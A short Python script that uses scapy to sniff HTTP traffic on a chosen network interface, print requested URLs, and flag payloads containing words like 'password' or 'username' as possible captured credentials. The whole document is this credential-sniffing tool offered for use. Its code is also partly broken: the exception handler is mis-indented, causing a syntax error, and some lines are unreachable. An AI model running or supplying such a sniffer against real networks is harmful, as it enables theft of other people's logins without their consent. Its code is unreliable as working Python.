#!/usr/bin/python3
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=afterSniff)



def geturl(packet):
    return str(packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path)
    pass

def getcreds(packet,possiblecreds):
    if packet.haslayer(scapy.Raw): 
        postr = packet[scapy.Raw].load
        for keyword in possiblecreds:
            if keyword in str(postr):
                return "[+] Possible Credentials Found :> "+str(postr)
                break




def afterSniff(packet):
    possiblecreds = ["password","username","uname","passwd","pass","login",]
    if packet.haslayer(http.HTTPRequest):
        url = geturl(packet)
        print("[=]URL:",url)
        creds = getcreds(packet,possiblecreds)
        if creds:
            print(creds)

                
interface = input("Enter your interface> ")
try:
    sniff(interface)
    except:
        print("Error Occoured, are your sure your interface was correct, use iwconfig to find out")
        exit()


def shred():
    print("Leave me here...")
